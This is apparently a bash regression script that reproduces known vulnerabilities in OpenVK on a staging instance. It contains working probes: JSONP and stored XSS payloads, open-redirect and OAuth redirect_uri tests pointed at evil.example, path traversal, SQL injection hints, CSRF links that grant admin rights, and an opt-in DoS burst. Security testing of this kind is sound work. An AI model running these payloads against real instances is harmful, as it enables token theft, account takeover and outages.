#!/usr/bin/env bash
# OpenVK security Steps-To-Reproduce runner (full vulnerability map).
# Demo / regression only — run against YOUR staging instance.
#
# Usage:
#   1. Set BASE_URL below (or: export BASE_URL=https://staging.example)
#   2. Optional: COOKIE_JAR / PHOTO_ID / ACCESS_TOKEN / …
#   3. ./tests/security/str_all.sh
#
# Opt-in destructive-ish probes:
#   STR_ALLOW_DOS=1 STR_DOS_N=30 ./tests/security/str_all.sh
#   STR_ALLOW_SQL_PROBE=1 ./tests/security/str_all.sh   # staging + admin cookie only

set -eu
# Note: pipefail off on purpose — empty grep in pipelines must not abort the runner.

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib.sh
source "${SCRIPT_DIR}/lib.sh"

# ─── Configure here ───────────────────────────────────────────────
BASE_URL="${BASE_URL:-https://CHANGE_ME}"

# Netscape cookie file from browser extension, or leave empty
COOKIE_JAR="${COOKIE_JAR:-}"
COOKIE_HEADER="${COOKIE_HEADER:-}"          # alternative: "name=value; …"
COOKIE_ADMIN="${COOKIE_ADMIN:-}"            # admin / Ban-write session file
COOKIE_ADMIN_HEADER="${COOKIE_ADMIN_HEADER:-}"

PHOTO_ID="${PHOTO_ID:-}"                    # numeric photo id for thumbnail IDOR
POST_OWNER="${POST_OWNER:-}"                # wall owner id
POST_ID="${POST_ID:-}"                      # post vid
CLUB_ID="${CLUB_ID:-}"                      # club number for CSRF demo
ATTACKER_USER_ID="${ATTACKER_USER_ID:-}"    # user to promote via setAdmin
ACCESS_TOKEN="${ACCESS_TOKEN:-}"            # API token for CORS / longpoll demos
TARGET_USER_ID="${TARGET_USER_ID:-}"        # other user id for XOR key forge

STR_ALLOW_DOS="${STR_ALLOW_DOS:-0}"
STR_DOS_N="${STR_DOS_N:-30}"
STR_ALLOW_SQL_PROBE="${STR_ALLOW_SQL_PROBE:-0}"
CURL_TIMEOUT="${CURL_TIMEOUT:-15}"

REPO_ROOT="${REPO_ROOT:-$(cd "${SCRIPT_DIR}/../.." && pwd)}"
REPORT_FILE="${REPORT_FILE:-${SCRIPT_DIR}/last_report.txt}"
EVIL_ORIGIN="https://evil.example"
# ──────────────────────────────────────────────────────────────────

require_base_url

# Populate global arrays USER_C / ADMIN_C for curl -b / -H Cookie
USER_C=()
ADMIN_C=()
if [[ -n "${COOKIE_JAR}" && -f "${COOKIE_JAR}" ]]; then
  USER_C=(-b "${COOKIE_JAR}")
elif [[ -n "${COOKIE_HEADER}" ]]; then
  USER_C=(-H "Cookie: ${COOKIE_HEADER}")
fi
if [[ -n "${COOKIE_ADMIN}" && -f "${COOKIE_ADMIN}" ]]; then
  ADMIN_C=(-b "${COOKIE_ADMIN}")
elif [[ -n "${COOKIE_ADMIN_HEADER}" ]]; then
  ADMIN_C=(-H "Cookie: ${COOKIE_ADMIN_HEADER}")
else
  ADMIN_C=("${USER_C[@]}")
fi

# ═══ P0 ═══════════════════════════════════════════════════════════

check_p0_1_jsonp() {
  section "P0-1 JSONP reflected XSS"
  curl_capture "${BASE_URL}/method/utils.getServerTime?callback=alert(1)//"
  if [[ "${HTTP_CODE}" == "000" ]]; then
    skip "P0-1 JSONP — host unreachable (${BASE_URL})"
    return
  fi
  if printf '%s' "$RESP_BODY" | grep -qE '^alert\(1\)//' \
    && printf '%s' "$RESP_CT" | grep -qiE 'javascript|ecmascript'; then
    vuln "P0-1 JSONP XSS — callback reflected as application/javascript"
    info "URL: ${BASE_URL}/method/utils.getServerTime?callback=alert(1)//"
    info "Body prefix: $(printf '%s' "$RESP_BODY" | head -c 80)"
  elif printf '%s' "$RESP_BODY" | grep -qE '^alert\(1\)//'; then
    vuln "P0-1 JSONP XSS — callback reflected (check Content-Type: ${RESP_CT:-none})"
  else
    ok "P0-1 JSONP — callback not reflected as executable JS"
  fi
}

check_p0_2_away() {
  section "P0-2a Away open redirect"
  local hdr
  hdr=$(curl -sS -D - -o /tmp/ovk_away_body --max-redirs 0 --connect-timeout 5 --max-time "$CURL_TIMEOUT" \
    "${BASE_URL}/away.php?to=https://example.com/" 2>/dev/null || true)
  RESP_HEADERS=$hdr
  RESP_LOCATION=$(printf '%s' "$hdr" | tr -d '\r' | grep -i '^Location:' | tail -1 | sed 's/^[Ll]ocation:[[:space:]]*//')
  HTTP_CODE=$(printf '%s' "$hdr" | tr -d '\r' | head -1 | awk '{print $2}')
  if [[ "${RESP_LOCATION}" == *"example.com"* ]]; then
    vuln "P0-2a Away redirect — Location: ${RESP_LOCATION}"
  elif [[ "${HTTP_CODE}" == "000" ]]; then
    skip "P0-2a Away — unreachable"
  elif grep -q 'example.com' /tmp/ovk_away_body 2>/dev/null && [[ "${RESP_LOCATION}" != *"example.com"* ]]; then
    ok "P0-2a Away — interstitial (no auto Location to example.com)"
  else
    ok "P0-2a Away — no open redirect to example.com (code=${HTTP_CODE} loc=${RESP_LOCATION:-none})"
  fi
  rm -f /tmp/ovk_away_body
}

check_p0_2_jreturnto() {
  section "P0-2b Login jReturnTo open redirect (URL accepts external)"
  curl_capture "${BASE_URL}/login?jReturnTo=https://evil.example/phish"
  if [[ "${HTTP_CODE}" == "000" ]]; then
    skip "P0-2b jReturnTo — unreachable"
    return
  fi
  # Page should still load; after login redirect is the real issue — we flag if param is echoed unsanitized
  if printf '%s' "$RESP_BODY" | grep -qE 'value="https://evil\.example|jReturnTo=https://evil\.example'; then
    vuln "P0-2b jReturnTo — external URL embedded in login page (post-login redirect risk)"
    info "Open ${BASE_URL}/login?jReturnTo=https://evil.example/phish then sign in"
  else
    ok "P0-2b jReturnTo — external URL not embedded as return target"
  fi

  section "P0-2c Language jReturnTo"
  local hdr
  hdr=$(curl -sS -D - -o /dev/null --max-redirs 0 --connect-timeout 5 --max-time "$CURL_TIMEOUT" \
    "${BASE_URL}/language?lg=en&jReturnTo=https://evil.example/" 2>/dev/null || true)
  local loc
  loc=$(printf '%s' "$hdr" | tr -d '\r' | grep -i '^Location:' | tail -1 | sed 's/^[Ll]ocation:[[:space:]]*//')
  if [[ "$loc" == *"evil.example"* ]]; then
    vuln "P0-2c Language jReturnTo — Location: $loc"
  else
    manual "P0-2c Language — try /language?lg=en&hash=CSRF&jReturnTo=https://evil.example/ with valid CSRF"
  fi
}

check_p0_2_imagefilter() {
  section "P0-2d ImageFilter open redirect (when hotlinking disabled=false)"
  local b64
  b64=$(printf 'https://evil.example/x' | base64 -w0 2>/dev/null || printf 'https://evil.example/x' | base64)
  local hdr
  hdr=$(curl -sS -D - -o /dev/null --max-redirs 0 --connect-timeout 5 --max-time "$CURL_TIMEOUT" \
    "${BASE_URL}/image.php?url=${b64}" 2>/dev/null || true)
  local loc code
  loc=$(printf '%s' "$hdr" | tr -d '\r' | grep -i '^Location:' | tail -1 | sed 's/^[Ll]ocation:[[:space:]]*//')
  code=$(printf '%s' "$hdr" | tr -d '\r' | head -1 | awk '{print $2}')
  if [[ "$loc" == *"evil.example"* ]]; then
    vuln "P0-2d ImageFilter — redirects to ${loc}"
  elif [[ "$loc" == *fn_placeholder* || "$loc" == "/assets/"* ]]; then
    ok "P0-2d ImageFilter — hotlink protection on (placeholder/allowlist)"
  else
    skip "P0-2d ImageFilter — inconclusive (code=${code:-?} loc=${loc:-none})"
  fi
}

check_p0_3_oauth() {
  section "P0-3 OAuth unrestricted redirect_uri"
  curl_capture "${BASE_URL}/authorize?client_name=str_demo&redirect_uri=https://evil.example/steal&response_type=token"
  if [[ "${HTTP_CODE}" == "000" ]]; then
    skip "P0-3 OAuth — unreachable"
    return
  fi
  if printf '%s' "$RESP_BODY" | grep -qiE 'Invalid URL|redirect_uri should'; then
    ok "P0-3 OAuth — rejects evil redirect_uri"
  elif [[ "${HTTP_CODE}" =~ ^2 ]]; then
    vuln "P0-3 OAuth — accepts redirect_uri=https://evil.example/steal (token theft after Allow)"
    info "Open URL as logged-in user → Allow → token lands on evil.example"
  else
    skip "P0-3 OAuth — unexpected HTTP ${HTTP_CODE}"
  fi
}

check_p0_4_photo_idor() {
  section "P0-4a Photo thumbnail IDOR"
  if [[ -z "${PHOTO_ID}" ]]; then
    skip "P0-4a Thumbnail — set PHOTO_ID (private photo numeric id)"
    manual "P0-4a Upload private photo as user A, open /photos/thumbnails/{id}_x.jpeg as user B"
    return
  fi
  local hdr loc code
  hdr=$(curl -sS -D - -o /dev/null --max-redirs 0 --connect-timeout 5 --max-time "$CURL_TIMEOUT" \
    "${USER_C[@]}" "${BASE_URL}/photos/thumbnails/${PHOTO_ID}_x.jpeg" 2>/dev/null || true)
  loc=$(printf '%s' "$hdr" | tr -d '\r' | grep -i '^Location:' | tail -1 | sed 's/^[Ll]ocation:[[:space:]]*//')
  code=$(printf '%s' "$hdr" | tr -d '\r' | head -1 | awk '{print $2}')
  if [[ "$code" =~ ^30 && -n "$loc" ]]; then
    vuln "P0-4a Thumbnail IDOR — HTTP ${code} → ${loc}"
  elif [[ "$code" == "403" || "$code" == "404" ]]; then
    ok "P0-4a Thumbnail — denied (${code})"
  else
    skip "P0-4a Thumbnail — code=${code:-?} loc=${loc:-none}"
  fi
}

check_p0_4_iapi() {
  section "P0-4b iapi getPhotosFromPost privacy leak"
  if [[ -z "${POST_OWNER}" || -z "${POST_ID}" ]]; then
    skip "P0-4b iapi — set POST_OWNER and POST_ID (closed wall post with photo)"
    manual "P0-4b POST /iapi/getPhotosFromPost/{owner}_{id} parentType=post without access"
    return
  fi
  curl_capture "${BASE_URL}/iapi/getPhotosFromPost/${POST_OWNER}_${POST_ID}" \
    -X POST -d "parentType=post"
  if printf '%s' "$RESP_BODY" | grep -q '"success"[[:space:]]*:[[:space:]]*1' \
    && printf '%s' "$RESP_BODY" | grep -qiE 'url|larger|blob'; then
    vuln "P0-4b iapi — returned photo URLs for ${POST_OWNER}_${POST_ID}"
    info "Body: $(printf '%s' "$RESP_BODY" | head -c 200)"
  elif printf '%s' "$RESP_BODY" | grep -q '"success"[[:space:]]*:[[:space:]]*0'; then
    ok "P0-4b iapi — success=0"
  else
    skip "P0-4b iapi — unexpected response HTTP ${HTTP_CODE}"
  fi
}

check_p0_5_admin() {
  section "P0-5 Admin Chandler ACL SQLi / CSRF"
  if [[ "${STR_ALLOW_SQL_PROBE}" != "1" ]]; then
    skip "P0-5a SQLi probe — set STR_ALLOW_SQL_PROBE=1 on staging + admin cookie"
  else
    if [[ ${#ADMIN_C[@]} -eq 0 ]]; then
      skip "P0-5a SQLi — need COOKIE_ADMIN"
    else
      manual "P0-5a SQLi — POST admin Chandler group name with a single quote; expect SQL error (do not DROP)"
      info "Endpoint under /admin/chandler/groups — inspect AdminPresenter raw query()"
    fi
  fi
  manual "P0-5b CSRF GET — as admin open: ${BASE_URL}/admin/chandler/groups/{UUID}?act=removeMember&uid={GUID}"
  info "Or <img src=\"…\"> while admin session is active"
}

check_p0_6_nospam() {
  section "P0-6 NoSpam raw WHERE SQLi"
  if [[ "${STR_ALLOW_SQL_PROBE}" != "1" ]]; then
    skip "P0-6 — set STR_ALLOW_SQL_PROBE=1 + Ban-write cookie"
    manual "P0-6 In /noSpam WHERE field try: 1=1 — should not run arbitrary SQL after fix"
    return
  fi
  manual "P0-6 With Ban-write session POST /noSpam search with where=1=1 or q='; expect SQL error / leak (staging only)"
}

check_p0_7_rpc() {
  section "P0-7 CSRF /rpc Apps.getRegularToken"
  manual "P0-7 From evil origin POST MessagePack to ${BASE_URL}/rpc method Apps.getRegularToken with victim cookies"
  info "Easiest demo: DevTools → copy Allow request from /authorize → replay without CSRF hash"
  if [[ ${#USER_C[@]} -gt 0 ]]; then
    info "Cookie present — still need msgpack client for auto check (left MANUAL)"
  fi
}

check_p0_8_club() {
  section "P0-8 Club setAdmin CSRF (GET)"
  if [[ -n "${CLUB_ID}" && -n "${ATTACKER_USER_ID}" ]]; then
    local url="${BASE_URL}/club${CLUB_ID}/setAdmin?user=${ATTACKER_USER_ID}"
    vuln "P0-8 CSRF URL ready (open as club owner — promotes attacker): ${url}"
    info "Also open generated evil_csrf HTML (see end of run)"
  else
    manual "P0-8 Set CLUB_ID + ATTACKER_USER_ID — then open /club{N}/setAdmin?user={id} as owner"
  fi
}

check_p0_8b_dos() {
  section "P0-8b Messenger longpoll DoS (/im)"
  local f
  f=$(repo_file "Web/Presenters/MessengerPresenter.php")
  local guarded=0
  if [[ -n "$f" ]] && grep -q 'LongpollGuard::acquire' "$f" && grep -q 'assertLongpollBudget\|rateLimit(2)' "$f"; then
    guarded=1
    ok "P0-8b static — LongpollGuard + IP budget on /im|/nim"
  fi
  if [[ "${STR_ALLOW_DOS}" != "1" ]]; then
    skip "P0-8b live DoS — set STR_ALLOW_DOS=1 STR_DOS_N=${STR_DOS_N} (warn the team first)"
    return
  fi
  if [[ ${#USER_C[@]} -eq 0 ]]; then
    skip "P0-8b live DoS — need user COOKIE_JAR (logged-in)"
    return
  fi
  info "Firing ${STR_DOS_N} parallel GETs to /im12 (timeout 20s each)…"
  local i
  for i in $(seq 1 "${STR_DOS_N}"); do
    (
      curl -sS -o /dev/null -w '%{http_code}' --max-time 20 "${USER_C[@]}" "${BASE_URL}/im12" || echo 000
    ) &
  done
  wait || true
  local sample
  sample=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "${BASE_URL}/" || echo 000)
  if [[ "$sample" == "000" || "$sample" == "502" || "$sample" == "503" ]]; then
    vuln "P0-8b DoS — site degraded after ${STR_DOS_N} parallel /im12 (homepage HTTP ${sample})"
  elif [[ "$guarded" -eq 1 ]]; then
    ok "P0-8b live — homepage still ${sample} after burst (guards present)"
  else
    vuln "P0-8b DoS probe ran (${STR_DOS_N} workers) — homepage still ${sample}; no static guards found"
  fi
}

check_p0_8c_hashtag_dos() {
  section "P0-8c Hashtag feed unauth DB/memory DoS (NEW)"
  # Evidence: Posts::getPostCountByHashtag uses sizeof($sel) → full LIKE materialization; no auth
  local f
  f=$(repo_file "Web/Models/Repositories/Posts.php")
  if [[ -n "$f" ]] && grep -A12 'function getPostCountByHashtag' "$f" | grep -qE 'LIKE|sizeof'; then
    vuln "P0-8c Hashtag DoS — getPostCountByHashtag uses LIKE/sizeof (unauth /feed/hashtag/...)"
    info "URL: ${BASE_URL}/feed/hashtag/test — parallel GETs burn MySQL+PHP memory"
  elif [[ -n "$f" ]] && grep -A12 'function getPostCountByHashtag' "$f" | grep -q 'MATCH'; then
    ok "P0-8c Hashtag count uses FULLTEXT MATCH"
  else
    skip "P0-8c — pattern not found (maybe fixed)"
  fi
  if [[ "${STR_ALLOW_DOS}" == "1" ]]; then
    info "Soft probe: 5× /feed/hashtag/a (not a full raid)"
    local j
    for j in 1 2 3 4 5; do
      curl -sS -o /dev/null -w "%{http_code}\n" --max-time 10 "${BASE_URL}/feed/hashtag/a" &
    done
    wait || true
  fi
}

check_p0_8d_thumb_dos() {
  section "P0-8d Thumbnail forceSize Imagick DoS (extends P0-4a)"
  local f
  f=$(repo_file "Web/Presenters/PhotosPresenter.php")
  if [[ -n "$f" ]] && grep -A40 'function renderThumbnail' "$f" | grep -q 'rateLimit'; then
    ok "P0-8d Thumbnail — rateLimit/CostlyOpGuard around forceSize"
  else
    manual "P0-8d Unauth GET /photos/thumbnails/{id}_{size}.jpeg triggers Imagick forceSize — enumerate ids for CPU burn"
    info "Same endpoint as photo IDOR; raid angle = mass resize without login"
  fi
}

# ═══ P1 ═══════════════════════════════════════════════════════════

check_p1_9_xor() {
  section "P1-9 Longpoll XOR key forge → IDOR"
  if [[ -z "${ACCESS_TOKEN}" || -z "${TARGET_USER_ID}" ]]; then
    skip "P1-9 — set ACCESS_TOKEN + TARGET_USER_ID"
    manual "P1-9 messages.getLongPollServer → forge key for other id → GET /nim{B}?act=a_check&key=…"
    return
  fi
  curl_capture "${BASE_URL}/method/messages.getLongPollServer?access_token=${ACCESS_TOKEN}"
  if ! printf '%s' "$RESP_BODY" | grep -q '"key"'; then
    skip "P1-9 — could not get longpoll key (HTTP ${HTTP_CODE})"
    info "Body: $(printf '%s' "$RESP_BODY" | head -c 160)"
    return
  fi
  manual "P1-9 Got longpoll key for current user — forge for TARGET_USER_ID=${TARGET_USER_ID} (XOR halves, see Messages.php)"
  info "Then: ${BASE_URL}/nim${TARGET_USER_ID}?act=a_check&key=FORGED&wait=5"
  info "Raw response snippet: $(printf '%s' "$RESP_BODY" | head -c 200)"
}

check_p1_10_source_xss() {
  section "P1-10 Post copyright/source stored XSS"
  local f
  f=$(repo_file "Web/Models/Entities/Post.php")
  if [[ -z "$f" ]]; then
    skip "P1-10 — REPO_ROOT missing Post.php"
    manual "P1-10 Post source payload + |noescape in templates"
    return
  fi
  if grep -A12 'function getSource' "$f" | grep -F 'formatLinks($orig_source)' >/dev/null; then
    vuln "P1-10 Source XSS — getSource(true) calls formatLinks without htmlspecialchars (${f})"
  else
    ok "P1-10 getSource/formatLinks pattern not found (maybe fixed)"
  fi
  manual "P1-10 Create post copyright: http://evil.example\"><img src=x onerror=alert(1)>"
}

check_p1_11_cors() {
  section "P1-11 VKAPI CORS reflects Referer"
  curl_capture "${BASE_URL}/method/utils.getServerTime" -H "Referer: ${EVIL_ORIGIN}/page"
  local acao
  acao=$(header_value "Access-Control-Allow-Origin")
  if [[ "$acao" == "${EVIL_ORIGIN}" || "$acao" == "${EVIL_ORIGIN}/"* ]]; then
    vuln "P1-11 CORS — ACAO reflects Referer: ${acao}"
  elif [[ "$acao" == "*" ]]; then
    vuln "P1-11 CORS — ACAO is *"
  elif [[ -z "$acao" ]]; then
    skip "P1-11 CORS — no ACAO header (HTTP ${HTTP_CODE})"
  else
    ok "P1-11 CORS — ACAO=${acao}"
  fi
}

check_p1_12_csrf_money() {
  section "P1-12 CSRF on coins / wall / gifts / 2FA"
  manual "P1-12 Open evil_csrf.generated.html while logged in as victim (forms without hash)"
  info "Covered: club setAdmin, illustrative coins/wall endpoints — adjust paths to your routes"
}

check_p1_13_sms() {
  section "P1-13 SMS OTP 16-bit entropy"
  local f
  f=$(repo_file "Web/Models/Entities/User.php")
  if [[ -z "$f" ]]; then
    skip "P1-13 — User.php not found"
    return
  fi
  if grep -A8 'function setPhoneWithVerification' "$f" | grep -q 'unpack("S"'; then
    vuln "P1-13 SMS OTP — unpack(\"S\", …) ≈ 65536 codes in User::setPhoneWithVerification"
  elif grep -A8 'function setPhoneWithVerification' "$f" | grep -q 'random_int'; then
    ok "P1-13 SMS OTP — uses random_int in setPhoneWithVerification"
  else
    skip "P1-13 — pattern not found (maybe already fixed)"
  fi
}

check_p1_14_login_rl() {
  section "P1-14 Login without rate limit (soft probe)"
  local f
  f=$(repo_file "Web/Presenters/AuthPresenter.php")
  if [[ -n "$f" ]] && grep -A30 'function renderLogin' "$f" | grep -q 'rateLimit'; then
    ok "P1-14 Login — AuthPresenter applies IP rateLimit on POST"
    return
  fi
  local i code captcha=0 blocked=0
  for i in 1 2 3 4 5 6 7 8; do
    code=$(curl -sS -o /tmp/ovk_login_body -w '%{http_code}' --max-time 10 \
      -X POST -d "login=str_nonexistent_user&password=wrong${i}" \
      "${BASE_URL}/login" 2>/dev/null || echo 000)
    if grep -qiE 'captcha|rate.?limit|слишком много' /tmp/ovk_login_body 2>/dev/null; then
      captcha=1
    fi
    if [[ "$code" == "429" ]]; then
      blocked=1
    fi
  done
  rm -f /tmp/ovk_login_body
  if [[ "$captcha" -eq 1 || "$blocked" -eq 1 ]]; then
    ok "P1-14 Login — captcha/429 observed during soft fail burst"
  else
    vuln "P1-14 Login — 8 failed POSTs without captcha/429 (no visible rate limit)"
  fi
}

check_p1_15_sandbox() {
  section "P1-15a Public /admin/sandbox"
  curl_capture "${BASE_URL}/admin/sandbox"
  if [[ "${HTTP_CODE}" == "000" ]]; then
    skip "P1-15a sandbox — unreachable"
    return
  fi
  if printf '%s' "$RESP_BODY" | grep -qE 'var_dump|array\([0-9]'; then
    vuln "P1-15a Sandbox — public var_dump at /admin/sandbox (HTTP ${HTTP_CODE})"
  elif [[ "${HTTP_CODE}" == "403" || "${HTTP_CODE}" == "404" ]]; then
    ok "P1-15a Sandbox — not publicly dumped (${HTTP_CODE})"
  else
    skip "P1-15a Sandbox — HTTP ${HTTP_CODE}, no clear var_dump"
  fi
}

check_p1_15_blob() {
  section "P1-15b Blob path check no-op (static)"
  local f
  f=$(repo_file "Web/Presenters/BlobPresenter.php")
  if [[ -z "$f" ]]; then
    skip "P1-15b Blob — file not found"
    return
  fi
  if grep -n 'strpos($path, $path)' "$f" >/dev/null; then
    vuln "P1-15b Blob — strpos(\$path, \$path) is a no-op in BlobPresenter.php"
  else
    ok "P1-15b Blob — no-op strpos not found (maybe fixed)"
  fi
}

check_p1_15_shell() {
  section "P1-15d Shell args unsescaped (static)"
  local f
  f=$(repo_file "Web/Util/Shell/Shell.php")
  if [[ -z "$f" ]]; then
    skip "P1-15d Shell — file not found"
    return
  fi
  # Vulnerable pattern: implode args then exec($this->command) without mapping escapeshellarg over $arguments
  if grep -F 'implode(" ", array_merge([$name], $arguments))' "$f" >/dev/null \
    && grep -n 'exec($this->command' "$f" >/dev/null; then
    vuln "P1-15d Shell — args imploded and passed to exec/system without per-arg escapeshellarg"
  else
    ok "P1-15d Shell — vulnerable implode/exec pattern not found"
  fi
}

check_p1_15_kb() {
  section "P1-15e Knowledge base path"
  curl_capture "${BASE_URL}/kb/..%2F..%2FREADME"
  if [[ "${HTTP_CODE}" == "200" ]] && printf '%s' "$RESP_BODY" | grep -qiE 'openvk|composer'; then
    vuln "P1-15e KB — path traversal-like success"
  else
    ok "P1-15e KB — traversal probe did not leak (HTTP ${HTTP_CODE})"
    manual "P1-15c Support CSRF — delete ticket without hash under victim session"
  fi
}

# ═══ Residual ═════════════════════════════════════════════════════

check_residual() {
  section "Residual High (static / soft)"

  local apps
  apps=$(repo_file "ServiceAPI/Apps.php")
  if [[ -n "$apps" ]] && grep -A8 'function pay' "$apps" | grep -q 'amount < 0'; then
    if ! grep -A8 'function pay' "$apps" | grep -qE 'amount <= 0|amount < 1'; then
      vuln "R-17 Apps.pay — rejects only amount < 0 (amount=0 still mints HMAC receipt)"
    else
      ok "R-17 Apps.pay — non-positive amount rejected"
    fi
  else
    skip "R-17 Apps.pay — pattern not found"
  fi

  local userp
  userp=$(repo_file "Web/Presenters/UserPresenter.php")
  if [[ -n "$userp" ]] && grep -n 'setCoins\|getCoins' "$userp" | head -1 >/dev/null; then
    manual "R-16 Commerce TOCTOU — parallel coin transfer/gift (no row lock) — race on staging"
  fi

  local vkapi
  vkapi=$(repo_file "Web/Presenters/VKAPIPresenter.php")
  if [[ -n "$vkapi" ]] && ! grep -q 'presenterName' "$vkapi"; then
    vuln "R-18 Maintenance — VKAPIPresenter does not set presenterName (section maintenance bypass)"
  else
    skip "R-18 — review VKAPIPresenter presenterName manually"
  fi

  # Host header soft probe
  curl_capture "${BASE_URL}/" -H "Host: evil.example"
  if printf '%s' "$RESP_BODY" | grep -qE 'https?://evil\.example'; then
    vuln "R-19 Host header — absolute URLs used evil.example in body"
  else
    ok "R-19 Host header — evil host not reflected in absolute URLs"
  fi
}

generate_evil_html() {
  local src="${SCRIPT_DIR}/evil_csrf.html"
  local dst="${SCRIPT_DIR}/evil_csrf.generated.html"
  if [[ ! -f "$src" ]]; then
    return
  fi
  local club="${CLUB_ID:-CLUB_ID}"
  local attacker="${ATTACKER_USER_ID:-ATTACKER_USER_ID}"
  sed -e "s|__BASE__|${BASE_URL}|g" \
      -e "s|__CLUB__|${club}|g" \
      -e "s|__ATTACKER__|${attacker}|g" \
      "$src" >"$dst"
  info "Wrote ${dst}"
}

print_team_demo() {
  section "5-minute demo checklist for the team"
  log "1. Show [VULN] lines above (JSONP, Away, Sandbox, CORS, OAuth, static greps)"
  log "2. Browser: ${BASE_URL}/method/utils.getServerTime?callback=alert(1)//"
  log "3. Browser: ${BASE_URL}/away.php?to=https://example.com/"
  log "4. If PHOTO_ID set — thumbnail IDOR; if POST_* — iapi leak"
  log "5. Open tests/security/evil_csrf.generated.html as club owner (optional)"
  log "6. Do NOT run STR_ALLOW_DOS=1 on shared prod without warning"
}

# ═══ main ═════════════════════════════════════════════════════════

log "OpenVK security STR — BASE_URL=${BASE_URL}"
log "Repo: ${REPO_ROOT}"

check_p0_1_jsonp
check_p0_2_away
check_p0_2_jreturnto
check_p0_2_imagefilter
check_p0_3_oauth
check_p0_4_photo_idor
check_p0_4_iapi
check_p0_5_admin
check_p0_6_nospam
check_p0_7_rpc
check_p0_8_club
check_p0_8b_dos
check_p0_8c_hashtag_dos
check_p0_8d_thumb_dos

check_p1_9_xor
check_p1_10_source_xss
check_p1_11_cors
check_p1_12_csrf_money
check_p1_13_sms
check_p1_14_login_rl
check_p1_15_sandbox
check_p1_15_blob
check_p1_15_shell
check_p1_15_kb

check_residual
generate_evil_html
print_team_demo
summary
write_report "${REPORT_FILE}"
